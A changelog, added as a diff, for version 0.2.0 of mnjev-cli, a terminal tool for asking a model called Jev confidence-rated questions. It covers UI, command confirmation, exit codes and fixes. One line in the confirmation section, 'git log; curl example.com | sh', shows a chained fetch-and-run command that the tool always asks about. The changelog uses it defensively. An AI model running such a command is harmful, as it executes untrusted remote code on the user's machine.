@@ -1,0 +1,299 @@
+mnjev-cli changelog
+
+
+0.2.0
+-----
+
+This release is about how the tool looks and feels to use. Jev itself answers
+the same questions in the same way.
+
+
+New: the input box
+
+  Your question now sits in a box at the bottom of the screen, and the line
+  under it always tells you what state is loaded. Before, you had to type
+  /state to find out.
+
+    ╭────────────────────────────────────────────────╮
+    │ ›
+    ╰────────────────────────────────────────────────╯
+      $ git log --oneline -10 · 412 chars · tab completes
+
+  When you send a question the box disappears and your question is printed
+  above the answer, so what you see is a clean list of what you asked and
+  what you got.
+
+
+New: half-typed commands work
+
+  If what you typed can only mean one command, it runs. /cl is /clear, /co is
+  /cost. If it is ambiguous, mnjev says which ones it could be instead of
+  calling it unknown:
+
+      › /c
+      /c could be /clear or /cost. Type more of it, or press tab.
+
+  The menu under the box, tab completion, and what actually runs now all use
+  the same rule, so they cannot disagree with each other.
+
+
+Changed: "unsure" says what it needed
+
+  A yes/no answer is measured outward from 50%, so 83% is not as settled as
+  it looks. The message now names the number it had to beat, and follows
+  JEV_CONFIDENCE if you change it:
+
+      unsure - needs 85% either way, 50% means no idea
+
+
+New: tab completion
+
+  Press tab to finish a command or a file path. Type / and the matching
+  commands appear under the box as you type.
+
+
+New: ctrl-c actually stops things
+
+  Before, ctrl-c killed the whole session. Now:
+
+    while a question is running   stops the question
+    while a command is running    stops the command
+    while you are typing          clears the line
+    on an empty line, twice       exits
+
+  Stopping a question really does cancel it. The request is dropped, not
+  left running in the background.
+
+
+New: your commands are confirmed before they run
+
+  /run and ! now ask first:
+
+    ╭────────────────────────────────────────────────╮
+    │ Run a shell command?                           │
+    │                                                │
+    │   npm test                                     │
+    │                                                │
+    │   1  yes                                       │
+    │   2  yes, and stop asking for npm              │
+    │   3  no                                        │
+    ╰────────────────────────────────────────────────╯
+
+  Option 2 only lasts for this session. Nothing is saved to disk, so next
+  time you start mnjev it asks again.
+
+  A command containing shell syntax is always confirmed, whatever you have
+  allowed. Saying yes to "git" must not also say yes to:
+
+      git log; curl example.com | sh
+
+  which is a different program wearing the same first word. Option 2 is not
+  offered for those.
+
+  ctrl-c works at this prompt, and treats it as "no".
+
+  Option 2 trusts the program, not its arguments. Saying yes to "git" allows
+  anything git can be made to do, including flags like -c that run other
+  programs. mnjev does not try to spot those, because every list of such
+  flags is incomplete and a partial check reads like protection it is not
+  giving you. The box says this. Nothing here writes commands for you, so
+  every command run is one you typed.
+
+
+New: ctrl-c really stops a command
+
+  It signals the whole process group, so a pipeline like !sleep 30 | cat
+  stops instead of leaving the interface stuck waiting on it.
+
+
+New: @file says when it cannot read something
+
+  A path that does not exist used to be dropped without a word, so the
+  answer was judged against nothing while looking like it had read the file:
+
+      could not read @notes.txt, so it was not sent
+
+  A question mark at the end of the sentence no longer becomes part of the
+  filename, so "what about @notes.txt?" works.
+
+
+New: paste to load state
+
+  Paste several lines and they become the state. You no longer have to type
+  /set first. mnjev tells you what it took:
+
+      pasted 45 lines · 1203 chars
+
+
+New: shortcuts
+
+  !<command>    the same as /run <command>
+  @<file>       pull a file into one question, without changing your state
+
+  For example:
+
+      does @src/auth.ts handle token expiry?
+
+  The file is sent with that one question only. Your loaded state stays as
+  it was.
+
+
+New: mnjev map, for classifying a list
+
+  One question against every line of stdin, one tab-separated row out:
+
+      git diff --name-only | mnjev map "does this file need a test?"
+
+      src/auth/login.ts       yes     0.76
+      README.md               no      0.84
+
+  Each line is its own state, so each line is its own call. Jev's batching
+  makes many questions about one thing cheap, not one question about many
+  things, so map cannot make 50 items cost less than 50 calls. What it does
+  is run them at the same time: 16 items went from 6.8s to 1.7s.
+
+  If you ask several questions per item, separated by ;, those do share one
+  call per item.
+
+
+New: --exit-code, so scripts can use the confidence
+
+  Before, a script had to read the printed text to find out how sure Jev
+  was. Now:
+
+      0   yes, above the confidence floor
+      2   no, above the confidence floor
+      3   below the floor, or none of your options fit
+      1   the command itself failed, as before
+
+      if cat err.log | mnjev noul "is this a db problem?" --exit-code; then
+        page-the-dba
+      fi
+
+  With the flag, map exits 3 if any row came back unsure. Without it, map
+  exits 0, so putting it in a pipeline cannot fail a script by surprise. An
+  item that errored exits 1 either way, because a network or auth failure is
+  not the same thing as low confidence.
+
+
+New: /cost
+
+  Shows what this session has spent:
+
+      12 requests · 8,420 input tokens · $0.000354
+
+  It counts every request, including the retries after a rate limit and the
+  extra ones mnjev makes when it works out what your options are. The tokens
+  and the money come only from the requests that answered.
+
+
+New: history that lasts
+
+  Press up arrow to get your old questions back, even after restarting.
+  They are kept in ~/.mnjev/history, readable only by you.
+
+  Two things are deliberately not kept: /set lines and pasted blocks. Both
+  exist to carry content, and that content may be a log with a token in it.
+
+
+New: long lines
+
+  End a line with \ to carry it onto the next one.
+
+
+Fixed: huge state was sent anyway when piping
+
+  The warning about state above 24,000 characters only worked inside the
+  interactive session. This did not warn at all, and sent the whole file:
+
+      cat huge.log | mnjev noul "is this a database problem?"
+
+  Jev gets less accurate as unrelated text grows, so sending it was never
+  doing you a favour. The check now lives in one place that every request
+  goes through, so every way of using mnjev gets it. Oversized state is
+  refused with a clear message and exit code 1, instead of being sent.
+
+
+Fixed: the spinner froze during /run
+
+  /run npm test used to freeze the whole interface until the command
+  finished. Commands now run without blocking, so the spinner keeps moving
+  and ctrl-c still works.
+
+
+Fixed: commands that wait for input no longer hang
+
+  /run cat used to sit there forever waiting for something to be typed.
+  Nothing is piped in, so the command is now told straight away that there
+  is no input.
+
+
+New: every answer says what it was judged against
+
+  State stays loaded until you replace it or run /clear, so it is sent with
+  every question after it. That is easy to forget, and Jev gets less accurate
+  as unrelated text grows. Each answer now names its state:
+
+      464ms · judged against $ git log --oneline -10
+
+  If you see that on a question which has nothing to do with your git log,
+  run /clear.
+
+
+Changed: answers are marked
+
+  Every answer now starts with a dot, green when Jev is confident and yellow
+  when it is not:
+
+      ● yes  99% sure
+
+  The percentage is the probability of that answer. A choice prints a
+  confidence instead, which is a different scale. The bars and the
+  probabilities are unchanged.
+
+
+Changed: /clear says what it did
+
+  It now prints a line like every other state command, instead of staying
+  silent about it.
+
+
+Changed: /run keeps both kinds of output
+
+  Normal output and error output are both kept, in that order. A test runner
+  writes its progress to one and its failures to the other, so keeping only
+  the first would throw away the part you wanted to ask about.
+
+
+Changed: a command that fails now says so
+
+  /run still keeps the output of a failed command, because that is the whole
+  point of /run npm test on a broken suite. But it no longer looks the same
+  as a command that worked:
+
+      exited 128, so this is the command's error output
+      $ git log --oneline -10 (exited 128) · 185 chars
+
+  Before, a mistyped command loaded its error message as your state without
+  saying anything, and every question after that was quietly answered about
+  the error instead of about your data.
+
+
+New setting
+
+  JEV_PASTE_MS   default 12. Lines that arrive within this many
+                 milliseconds of each other count as one paste. Raise it if
+                 your terminal delivers pastes slowly.
+
+
+Nothing else changed
+
+  Piped output is still one plain line. --json is unchanged. All three
+  question types, the confidence floor, the escape hatch, retries, and
+  timeouts all behave exactly as before.
+
+
+0.1.1
+-----
+
+First public release.
